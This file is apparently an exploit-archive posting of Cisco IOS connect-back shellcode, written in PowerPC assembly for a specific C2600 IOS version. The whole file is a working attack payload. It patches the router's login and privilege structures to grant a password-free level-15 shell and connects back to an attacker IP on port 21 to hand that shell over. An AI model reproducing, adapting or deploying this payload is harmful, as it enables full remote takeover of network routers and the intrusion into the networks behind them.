# ----------------------------------------------------------------------------------------
#
# Cisco IOS Connectback shellcode v1.0
# (c) 2007 IRM Plc
# By Gyan Chawdhary
#
# ----------------------------------------------------------------------------------------
#
# The code creates a new TTY, allocates a shell with privilege level 15 and connects back
# on port 21
#
# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.
#
#
# The following five hard-coded addresses must be located for the target IOS version.
#
# The hard-coded addresses used here are for:
#
# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)
#
# ----------------------------------------------------------------------------------------
.equ malloc, 0x804785CC
.equ allocate_tty, 0x803d155c
.equ ret, 0x804a42e8
.equ addr, 0x803c4ad8
.equ str, 0x81e270b4
.equ tcp_connect, 0x80567568
.equ tcp_execute_command, 0x8056c354
.equ login, 0x8359b1f4
.equ god, 0xff100000
.equ priv, 0x8359be64
# ----------------------------------------------------------------------------------------

main:
	stwu 1,-48(1)
	mflr 0
	stw 31,44(1)
	stw 0,52(1)
	mr 31,1
	li 3,512
	lis 9,malloc@ha  #malloc() memory for tcp structure
	la 9,malloc@l(9)
	mtctr 9
	bctrl
	mr 0,3
	stw 0,20(31)
	lwz 9,12(31)
	li 0,1
	stb 0,0(9)
	lwz 9,12(31)
	lis 0,0xac1e #  connect back ip address
	ori 0,0,1018 #
	stw 0,4(9)
	li 3,66
	li 4,0
	lis 9,allocate_tty@ha  # allocate new TTY
	la 9,allocate_tty@l(9)
	mtctr 9
	bctrl
	addi 0,31,24

	# Fix TTY structure to enable level 15 shell without password
	#
	#
	##########################################################

	# login patch begin
	lis 9, login@ha
	la 9, login@l(9)
	li 8,0
	stw 8, 0(9)
	# login patch end

	#IDA placeholder for con0
	#
	# lis     %r9, ((stdio+0x10000)@h)
        # lwz     %r9, stdio@l(%r9)
        # lwz     %r0, 0xDE4(%r9) #priv struct
        #
	# priv patch begin
	lis 9, priv@ha
	la 9, priv@l(9)
	lis 8, god@ha
	la 8, god@l(8)
	stw 8, 0(9)
	# priv patch end

	###########################################################

	li 3,0
	li 4,21		# Port 21 for connectback
	lwz 5,12(31)
	li 6,0
	li 7,0
	mr 8,0
	li 9,0
	lis 11,tcp_connect@ha 	# Connect to attacker IP
	la 11,tcp_connect@l(11)
	mtctr 11
	bctrl
	mr 0,3
	stw 0,20(31)
	li 3,66
	lwz 4,20(31)
	li 5,0
	li 6,0
	li 7,0
	li 8,0
	li 9,0
	li 10,0
	lis 11,tcp_execute_command@ha   # Execute Virtual Terminal on outgoing connection, similar to /bin/bash
	la 11,tcp_execute_command@l(11)
	mtctr 11
	bctrl
	lwz 11,0(1)
	lwz 0,4(11)
	mtlr 0
	lwz 31,-4(11)
	mr 1,11

	###########################################
	lis     9, addr@ha
        addi    0, 9, addr@l
        mtctr   0
        xor 3,3,3
        addi    3,0, -2
        lis     10, str@ha
        addi    4, 10, str@l
        bctrl
        lis     10, ret@ha
        addi    4, 10, ret@l
        mtctr   4
        bctrl

# milw0rm.com [2008-08-13]